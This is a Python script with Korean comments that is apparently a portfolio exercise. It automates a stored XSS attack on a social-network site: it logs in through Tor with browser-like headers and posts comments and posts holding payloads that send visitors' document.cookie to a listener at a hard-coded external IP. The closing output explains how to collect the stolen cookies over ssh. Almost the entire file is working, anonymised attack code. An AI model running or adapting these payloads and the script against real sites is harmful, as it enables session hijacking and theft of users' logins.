#!/usr/bin/env python3
"""
Stored XSS Attack with Tor - Vulnerable SNS 게시물/댓글 공격
포트폴리오 목적: Tor를 통한 익명 Stored XSS 공격 시뮬레이션
"""

import requests
import time
import sys
from new_payloads import NewPayloadGenerator
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 색상
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class VulnerableSNSAttacker:
    """Vulnerable SNS XSS 자동 공격 with Tor"""

    def __init__(self, base_url, listener_url, username='alice', password='alice2024', use_tor=True):
        self.base_url = base_url
        self.listener_url = listener_url
        self.username = username
        self.password = password
        self.use_tor = use_tor
        self.session = self._create_session()

    def _create_session(self):
        """브라우저처럼 보이는 세션 생성"""
        session = requests.Session()

        # Tor 프록시 설정
        if self.use_tor:
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            print(f"{Colors.CYAN}🕵️  Tor 프록시 사용 중...{Colors.END}")

        # 진짜 브라우저처럼 보이는 헤더
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        })

        # 재시도 설정
        adapter = requests.adapters.HTTPAdapter(max_retries=3)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        return session

    def test_connection(self):
        """연결 테스트"""
        print(f"{Colors.BLUE}[*] 서버 연결 테스트...{Colors.END}")

        try:
            response = self.session.get(self.base_url, timeout=15)
            print(f"{Colors.GREEN}✓ 서버 연결 성공! (Status: {response.status_code}){Colors.END}\n")
            return True
        except requests.exceptions.ProxyError:
            print(f"{Colors.RED}✗ Tor 프록시 연결 실패!{Colors.END}")
            print(f"{Colors.YELLOW}  Tor가 실행 중인지 확인하세요: 'tor' 또는 'brew services start tor'{Colors.END}\n")
            return False
        except requests.exceptions.Timeout:
            print(f"{Colors.RED}✗ 연결 타임아웃! 서버가 응답하지 않습니다.{Colors.END}\n")
            return False
        except Exception as e:
            print(f"{Colors.RED}✗ 연결 오류: {e}{Colors.END}\n")
            return False

    def login(self):
        """로그인 (브라우저 시뮬레이션)"""
        print(f"{Colors.BLUE}[*] 로그인 시도: {self.username}{Colors.END}")

        # Step 1: 로그인 페이지 먼저 방문 (쿠키/세션 획득)
        login_page_url = f"{self.base_url}/login.php"

        try:
            print(f"{Colors.CYAN}   → 로그인 페이지 방문...{Colors.END}")
            self.session.get(login_page_url, timeout=15)
            time.sleep(0.5)  # 사람처럼 행동

        except Exception as e:
            print(f"{Colors.YELLOW}   ⚠ 로그인 페이지 로드 실패 (계속 진행){Colors.END}")

        # Step 2: 로그인 폼 제출
        data = {
            'username': self.username,
            'password': self.password
        }

        # Referer 헤더 추가 (브라우저처럼)
        headers = {
            'Referer': login_page_url,
            'Origin': self.base_url,
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        try:
            print(f"{Colors.CYAN}   → 로그인 폼 제출...{Colors.END}")
            response = self.session.post(
                login_page_url,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=15
            )

            # 로그인 성공 확인
            if 'index.php' in response.url or 'dashboard' in response.text.lower() or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 로그인 성공!{Colors.END}")

                # 쿠키 확인
                if self.session.cookies:
                    print(f"{Colors.GREEN}   쿠키: {len(self.session.cookies)} 개{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 로그인 실패 (상태: {response.status_code}){Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 로그인 오류: {e}{Colors.END}\n")
            return False

    def post_comment(self, post_id, payload):
        """댓글에 XSS 페이로드 주입"""
        print(f"{Colors.YELLOW}[*] 댓글 작성 중... (Post ID: {post_id}){Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/add_comment.php"
        data = {
            'post_id': post_id,
            'content': payload
        }

        headers = {
            'Referer': f"{self.base_url}/index.php",
            'Origin': self.base_url,
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        try:
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=15
            )

            if 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 댓글 작성 성공!{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 댓글 작성 실패 (상태: {response.status_code}){Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

    def post_new_post(self, payload):
        """게시물에 XSS 페이로드 주입"""
        print(f"{Colors.YELLOW}[*] 게시물 작성 중...{Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/new_post.php"
        data = {
            'content': payload
        }

        headers = {
            'Referer': f"{self.base_url}/new_post.php",
            'Origin': self.base_url,
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        try:
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=15
            )

            if 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 게시물 작성 성공!{Colors.END}\n")
                return True
            elif '허용되지 않은' in response.text:
                print(f"{Colors.RED}✗ 차단됨: 허용되지 않은 태그{Colors.END}\n")
                return False
            else:
                print(f"{Colors.RED}✗ 게시물 작성 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

def check_tor():
    """Tor 실행 확인"""
    print(f"{Colors.CYAN}[*] Tor 연결 확인 중...{Colors.END}")

    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        response = session.get('https://check.torproject.org/api/ip', timeout=10)
        data = response.json()

        if data.get('IsTor'):
            print(f"{Colors.GREEN}✓ Tor 연결 성공! IP: {data.get('IP')}{Colors.END}\n")
            return True
        else:
            print(f"{Colors.YELLOW}⚠ Tor를 통하지 않음{Colors.END}\n")
            return False

    except Exception as e:
        print(f"{Colors.YELLOW}⚠ Tor 연결 실패: {e}{Colors.END}")
        print(f"{Colors.YELLOW}  Tor 없이 진행하려면 --no-tor 옵션 사용{Colors.END}\n")
        return False

def main():
    import argparse

    parser = argparse.ArgumentParser(description='Vulnerable SNS Stored XSS Attack')
    parser.add_argument('--target', default='http://3.34.90.201', help='Target URL')
    parser.add_argument('--listener', default='http://3.113.201.239:9999/steal', help='Listener URL')
    parser.add_argument('--user', default='alice', help='Username')
    parser.add_argument('--password', default='alice2024', help='Password')
    parser.add_argument('--no-tor', action='store_true', help='Disable Tor')
    args = parser.parse_args()

    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}🎯 Vulnerable SNS Stored XSS Attack (with Tor){Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    BASE_URL = args.target
    LISTENER_URL = args.listener
    USERNAME = args.user
    PASSWORD = args.password
    USE_TOR = not args.no_tor

    print(f"{Colors.BLUE}📡 Target: {BASE_URL}{Colors.END}")
    print(f"{Colors.BLUE}📡 Listener: {LISTENER_URL}{Colors.END}")
    print(f"{Colors.BLUE}👤 User: {USERNAME}{Colors.END}")
    print(f"{Colors.BLUE}🕵️  Tor: {'Enabled' if USE_TOR else 'Disabled'}{Colors.END}\n")

    # Tor 확인
    if USE_TOR:
        if not check_tor():
            print(f"{Colors.YELLOW}Tor 없이 진행하려면 '--no-tor' 옵션을 사용하세요.{Colors.END}")
            print(f"{Colors.YELLOW}또는 Tor를 시작하세요: 'tor' 또는 'brew services start tor'{Colors.END}\n")

            response = input(f"{Colors.CYAN}Tor 없이 계속하시겠습니까? [y/N]: {Colors.END}")
            if response.lower() != 'y':
                sys.exit(1)
            USE_TOR = False

    # 공격자 인스턴스 생성
    attacker = VulnerableSNSAttacker(BASE_URL, LISTENER_URL, USERNAME, PASSWORD, USE_TOR)

    # 페이로드 생성기
    gen = NewPayloadGenerator(LISTENER_URL)

    # 댓글용 페이로드 (필터링 없음!)
    comment_payloads = [
        f'<img/src=x/onerror=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<img/src=x/onerror=new(Image).src="{LISTENER_URL}?c="+document.cookie>',
        f'<details/open/ontoggle=fetch("{LISTENER_URL}?c="+document.cookie)>',
        f'<input/onfocus=fetch("{LISTENER_URL}?c="+document.cookie)/autofocus>',
        f'<iframe/src="javascript:fetch(\'{LISTENER_URL}?c=\'+document.cookie)">',
    ]

    # 게시물용 페이로드
    post_payloads = gen.slash_variants()[:3]

    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}공격 시작{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    # 연결 테스트
    if not attacker.test_connection():
        print(f"{Colors.RED}❌ 서버 연결 실패. 종료합니다.{Colors.END}")
        sys.exit(1)

    # 로그인
    if not attacker.login():
        print(f"{Colors.RED}❌ 로그인 실패. 종료합니다.{Colors.END}")
        sys.exit(1)

    # 댓글 XSS 공격
    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📝 댓글 XSS 공격 (필터링 없음!){Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    success_count = 0
    for idx, payload in enumerate(comment_payloads, 1):
        print(f"{Colors.YELLOW}[{idx}/{len(comment_payloads)}]{Colors.END}")

        if attacker.post_comment(1, payload):
            success_count += 1
            print(f"{Colors.GREEN}✓ 페이로드 주입 성공! 피해자가 피드를 보면 쿠키가 탈취됩니다.{Colors.END}\n")
            break
        else:
            print(f"{Colors.RED}✗ 실패{Colors.END}\n")

        time.sleep(2)  # 사람처럼 행동

    # 게시물 XSS 공격
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📄 게시물 XSS 공격 (일부 필터링){Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    for idx, payload in enumerate(post_payloads, 1):
        print(f"{Colors.YELLOW}[{idx}/{len(post_payloads)}]{Colors.END}")

        if attacker.post_new_post(payload):
            success_count += 1
            print(f"{Colors.GREEN}✓ 게시물 주입 성공!{Colors.END}\n")
            break
        else:
            print(f"{Colors.RED}✗ 차단됨{Colors.END}\n")

        time.sleep(2)

    # 결과 요약
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 공격 결과{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    print(f"총 시도: {len(comment_payloads) + len(post_payloads)}")
    print(f"{Colors.GREEN}성공: {success_count}{Colors.END}")
    print(f"{Colors.RED}실패: {len(comment_payloads) + len(post_payloads) - success_count}{Colors.END}\n")

    if success_count > 0:
        print(f"{Colors.GREEN}{'='*80}{Colors.END}")
        print(f"{Colors.GREEN}✓ XSS 페이로드 주입 성공!{Colors.END}")
        print(f"{Colors.GREEN}{'='*80}{Colors.END}\n")
        print(f"{Colors.YELLOW}다음 단계:{Colors.END}")
        print(f"1. 자신 또는 다른 사용자가 피드 접속: http://{BASE_URL}/index.php")
        print(f"2. 쿠키가 자동으로 {LISTENER_URL}로 전송됨")
        print(f"3. 서버에서 확인: ssh ubuntu@3.113.201.239 'tail -f listener.log'")
        print(f"4. 쿠키 파일 확인: 'cat stolen_cookies/cookie_*.json'\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 공격 중단됨{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ 오류 발생: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
